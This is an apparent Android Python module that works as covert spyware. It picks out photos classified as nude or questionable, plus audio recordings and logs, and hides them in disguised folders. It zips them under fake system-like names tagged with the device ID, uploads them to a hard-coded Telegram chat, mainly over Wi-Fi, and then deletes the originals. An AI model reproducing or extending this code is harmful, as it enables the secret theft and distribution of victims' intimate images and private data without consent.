# -*- coding: utf-8 -*-
import os
import time
import random
import threading
import logging
import gc
import string
import json
import zipfile
from datetime import datetime

# ========== إعداد المسارات (متوافقة مع بقية الملفات) ==========
def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
H = os.path.join(P, "harvest")               # المجلد النهائي للملفات المضغوطة
PENDING = os.path.join(H, "pending_upload")  # مجلد انتظار التأكيد (احتياطي)
QUEUE = os.path.join(P, ".cache_thumb")      # مجلد مؤقت للصور قبل الضغط (مخفي وموهم)

for d in [P, H, PENDING, QUEUE]:
    if not os.path.exists(d):
        os.makedirs(d)

logging.basicConfig(filename=os.path.join(P, "z.log"), level=logging.ERROR, filemode='a')

try:
    from jnius import autoclass
    JNI_AVAILABLE = True
except:
    JNI_AVAILABLE = False


class DailyZipper:
    def __init__(self, scanner=None, tg=None):
        self.sc = scanner
        self.tg = tg
        # تم إزالة self.pw لأننا لم نعد نستخدم pyzipper
        self.max_b = 48 * 1024 * 1024   # 48MB (آمن تحت حد 50MB)
        self.active = False
        self.device_tag = self._get_device_tag()

    def _get_device_tag(self):
        """استخراج معرف جهاز قصير (أول 8 خانات من ANDROID_ID أو hash عشوائي)"""
        try:
            from jnius import autoclass
            Secure = autoclass('android.provider.Settings$Secure')
            ctx = autoclass('org.kivy.android.PythonActivity').mActivity
            aid = Secure.getString(ctx.getContentResolver(), Secure.ANDROID_ID)
            if aid:
                return aid[:8].lower()
        except:
            pass
        try:
            Build = autoclass('android.os.Build')
            model = f"{Build.MANUFACTURER} {Build.MODEL}"
            return hashlib.md5(model.encode()).hexdigest()[:8]
        except:
            return "unknown"

    # ========== توليد اسم ملف وهمي ==========
    def _gen_name(self):
        prefixes = ["cache_", "sys_upd_", "tmp_vol_", "core_st_", "db_sync_"]
        date_str = datetime.now().strftime("%y%m%d")
        tag = self.device_tag
        chars = string.ascii_letters + string.digits
        suffix = ''.join(random.choices(chars, k=6))
        prefix = random.choice(prefixes)
        return f"{prefix}{date_str}_{tag}_{suffix}.zip"

    # ========== حذف بسيط (بدون تدمير - مساحة التطبيق آمنة) ==========
    def _delete_file(self, path):
        try:
            if os.path.exists(path):
                os.remove(path)
        except Exception as e:
            logging.error(f"Delete error: {e}")

    # ========== التحقق من الاتصال عبر Wi-Fi ==========
    def _is_on_wifi(self):
        if not JNI_AVAILABLE:
            return True
        try:
            ctx = autoclass('org.kivy.android.PythonActivity').mActivity
            cm = ctx.getSystemService("connectivity")
            n = cm.getActiveNetworkInfo()
            return n and n.isConnected() and n.getType() == 1  # TYPE_WIFI = 1
        except:
            return True

    # ========== إرسال آمن مع إعادة محاولة ==========
    def _safe_send(self, zip_path, caption):
        delays = [2, 4, 8]
        for delay in delays:
            try:
                with open(zip_path, 'rb') as fobj:
                    target = getattr(self.tg, 'dat', -1003787520015)
                    resp = self.tg._api("sendDocument",
                                        {"chat_id": target, "caption": caption},
                                        {"document": fobj})
                if resp and resp.get('ok'):
                    return True
            except Exception as e:
                logging.error(f"Send error: {e}")
            time.sleep(delay)
        return False

    # ========== الإرسال الفوري اليدوي ==========
    def force_send_now(self, chat_id=None):
        if self.active:
            if chat_id:
                self.tg._api("sendMessage", {"chat_id": chat_id, "text": "⏳ عملية حصاد جارية بالفعل..."})
            return

        files_to_pack = []
        for folder in [QUEUE, PENDING]:
            if os.path.exists(folder):
                for f in os.listdir(folder):
                    path = os.path.join(folder, f)
                    if os.path.isfile(path):
                        files_to_pack.append(path)

        if not files_to_pack:
            if chat_id:
                self.tg._api("sendMessage", {"chat_id": chat_id, "text": "📭 لا توجد ملفات جديدة للحصاد حالياً."})
            return

        if chat_id:
            self.tg._api("sendMessage", {"chat_id": chat_id, "text": f"🚀 جاري معالجة {len(files_to_pack)} ملفاً..."})
        threading.Thread(target=self._pack_and_ship, args=(files_to_pack, True, chat_id), daemon=True).start()

    # ========== الضغط والإرسال (باستخدام zipfile القياسي) ==========
    def _pack_and_ship(self, files, bypass_wifi=False, report_id=None):
        if not files or self.active:
            return
        if not bypass_wifi and not self._is_on_wifi():
            logging.info("Not on WiFi, skipping automatic harvest.")
            return

        self.active = True

        # تقسيم الملفات إلى دفعات حسب الحجم
        batches = []
        cur_batch, cur_size = [], 0
        for f in files:
            if not os.path.exists(f):
                continue
            try:
                fsz = os.path.getsize(f)
                if cur_size + fsz > self.max_b:
                    if cur_batch:
                        batches.append(cur_batch)
                    cur_batch, cur_size = [], 0
                cur_batch.append(f)
                cur_size += fsz
            except:
                continue
        if cur_batch:
            batches.append(cur_batch)

        # معالجة كل دفعة
        for idx, batch in enumerate(batches):
            zip_name = self._gen_name()
            zip_path = os.path.join(H, zip_name)

            try:
                # بناء بيانات manifest
                manifest_data = []
                for f in batch:
                    fname = os.path.basename(f)
                    fsize = os.path.getsize(f) if os.path.exists(f) else 0
                    ftype = "other"
                    if fname.lower().endswith(('.jpg','.jpeg','.png')):
                        ftype = "image"
                    elif fname.lower().endswith('.aac'):
                        ftype = "audio"
                    elif fname.lower().endswith('.txt'):
                        ftype = "log"
                    manifest_data.append({
                        "name": fname,
                        "size": fsize,
                        "type": ftype,
                        "timestamp": int(os.path.getmtime(f)) if os.path.exists(f) else 0
                    })

                # إنشاء ملف المؤقت manifest (دون تشفير)
                manifest_path = os.path.join(H, f"manifest_{int(time.time())}.json")
                with open(manifest_path, 'w') as mf:
                    json.dump(manifest_data, mf, indent=2)

                # إنشاء ZIP عادي (بدون تشفير) باستخدام zipfile
                with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                    for f in batch:
                        zf.write(f, os.path.basename(f))
                    zf.write(manifest_path, "manifest.json")

                # حذف ملف manifest المؤقت
                if os.path.exists(manifest_path):
                    os.remove(manifest_path)

                caption = f"📦 {'إرسال فوري' if bypass_wifi else 'حصاد تلقائي'} | دفعة {idx+1}/{len(batches)}"
                success = self._safe_send(zip_path, caption)

                if success:
                    for f in batch:
                        self._delete_file(f)
                    if report_id:
                        self.tg._api("sendMessage", {"chat_id": report_id, "text": f"✅ تم إرسال الدفعة {idx+1} بنجاح"})
                else:
                    if report_id:
                        self.tg._api("sendMessage", {"chat_id": report_id, "text": f"❌ فشل إرسال الدفعة {idx+1}"})

            except Exception as e:
                logging.error(f"Packing error: {e}")
                if report_id:
                    self.tg._api("sendMessage", {"chat_id": report_id, "text": f"⚠️ خطأ في الضغط: {str(e)[:100]}"})
            finally:
                if os.path.exists(zip_path):
                    os.remove(zip_path)

            if idx < len(batches) - 1:
                time.sleep(5)

        self.active = False
        gc.collect()

        if report_id:
            self.tg._api("sendMessage", {"chat_id": report_id, "text": "🏁 انتهت عملية الإرسال الفوري."})

    # ========== الحصاد التلقائي ==========
    def run(self):
        if self.active or not self._is_on_wifi():
            return

        all_files = []

        if self.sc:
            try:
                for cat in ["nude", "questionable"]:
                    items = self.sc.get_gallery_by_category(cat, limit=150)
                    all_files.extend([i["path"] for i in items if "path" in i])
            except Exception as e:
                logging.error(f"Scanner error: {e}")

        if os.path.exists(QUEUE):
            for f in os.listdir(QUEUE):
                path = os.path.join(QUEUE, f)
                if os.path.isfile(path):
                    all_files.append(path)

        try:
            for f in os.listdir(P):
                if f.endswith(".log") and f not in ["z.log", "t.log"]:
                    path = os.path.join(P, f)
                    if os.path.exists(path) and os.path.getsize(path) > 100 * 1024:
                        all_files.append(path)
        except Exception as e:
            logging.error(f"Logs error: {e}")

        if all_files:
            if self.tg and hasattr(self.tg, 'notify_harvest'):
                try:
                    did = getattr(self.sc, 'did', 'Unknown')
                    self.tg.notify_harvest(did, len(all_files))
                except:
                    pass
            threading.Thread(target=self._pack_and_ship, args=(all_files, False, None), daemon=True).start()


# ========== دالة المصنع ==========
def create(scanner=None, telegram=None):
    return DailyZipper(scanner, telegram)
